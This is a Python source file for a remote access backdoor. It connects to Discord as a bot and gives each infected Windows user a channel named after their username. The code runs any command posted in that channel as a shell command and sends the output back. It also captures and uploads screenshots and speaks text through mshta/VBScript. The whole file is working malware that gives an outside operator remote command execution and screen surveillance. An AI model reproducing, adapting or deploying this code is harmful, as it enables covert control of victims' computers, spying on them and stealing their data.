import discord, time, datetime, os, sys, subprocess, pyautogui

command_decrypt = ""

channel_id = 0

client = discord.Client()

def config(mode):
    txt = str(open(os.path.abspath(os.path.dirname(sys.argv[0])) + "\\config.ini", "r", encoding='utf-8').read())
    if "GitHub: https://github.com/Game-K-Hack" and "Donate: https://www.paypal.com/paypalme/gamekdonate" in txt:
        if mode == "token":
            start = txt.index("token_bot=") + len("token_bot=")
            end = txt.index("\nname_channel_cloning=", start)
            return str(txt[start:end])
        if mode == "name_channel":
            tmp = txt.split("\n")
            return tmp[len(tmp)-1].replace("name_channel_cloning=","")

@client.event
async def on_ready():
    global channel_id

    print('We have logged in as {0.user}'.format(client))

    liste_server = []
    liste_server_name = []
    liste_server_id = []
    liste_channel = []
    liste_channel_name = []
    liste_channel_id = []
    for guild in client.guilds:
        for channel in guild.text_channels:
            liste_server.append(guild)
            liste_server_name.append(guild.name)
            liste_server_id.append(guild.id)
            liste_channel.append(channel)
            liste_channel_name.append(channel.name)
            liste_channel_id.append(channel.id)

    if str(os.getenv("UserName")).replace(" ", "-").lower() in liste_channel_name:
        pass
    else:
        existing_channel = discord.utils.get(guild.channels, name=config("name_channel"))
        await existing_channel.clone(name=str(os.getenv("UserName")))
    
    loop = 1
    while loop == 1:
        try:
            x = 0
            while x < len(liste_channel_name):
                if str(os.getenv("UserName")).replace(" ", "-").lower() in str(liste_channel_name[x]):
                    channel_id = int(liste_channel_id[x])
                    x = len(liste_channel_name) + 1
                else:
                    x = x + 1
            print(channel_id)
            loop = 0
        except:
            continue
    

@client.event
async def on_message(message):
    global channel_id

    if message.author == client.user:     # Anti-boucle
        return                            #

    if message.channel.id == channel_id:
        tmp = str(await client.http.get_message(message.channel.id, message.id))
        start = tmp.index("'content': '") + len("'content': '")
        end = tmp.index("', 'channel_id'", start )
        command_decrypt = str(tmp[start:end])

        if command_decrypt == "*ping":
            await message.channel.send("ping=1")

        if "*speak " in command_decrypt:
            try:
                out = str(subprocess.run('''mshta vbscript:Execute("CreateObject(""SAPI.SpVoice"").Speak(""''' + command_decrypt.replace("*speak ", "") + '''"")(window.close)")''', capture_output=True, shell=True, encoding='cp437').stdout)
                await message.channel.send("speak=1")
            except:
                await message.channel.send("speak=0")

        elif command_decrypt == "*print-screen":
            myScreenshot = pyautogui.screenshot()
            date = datetime.datetime.now()
            screenshot_date = (str(date.day) + "-" + str(date.month) + "-" + str(date.year) + " " + str(date.hour) + "-" + str(date.minute) + "-" + str(date.second))
            chemin_image = "C:/Users/{}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/{}.png".format(str(os.getenv("UserName")), str(screenshot_date))
            myScreenshot.save(chemin_image)
            await message.channel.send(file=discord.File(chemin_image))
            os.remove(chemin_image)

        elif command_decrypt != "":                                                                                     # Commande CMD
            out = str(subprocess.run(str(command_decrypt), capture_output=True, shell=True, encoding='cp437').stdout)   #
            n = 1990                                                                                                    #
            tmp_list = [out[i:i+n] for i in range(0, len(out), n)]                                                      #
            for i in range(len(tmp_list)):                                                                              #
                await message.channel.send("```" + str(tmp_list[i]) + "```")                                            #
        else:                                                                                                           #
            pass                                                                                                        #

client.run(config("token"))
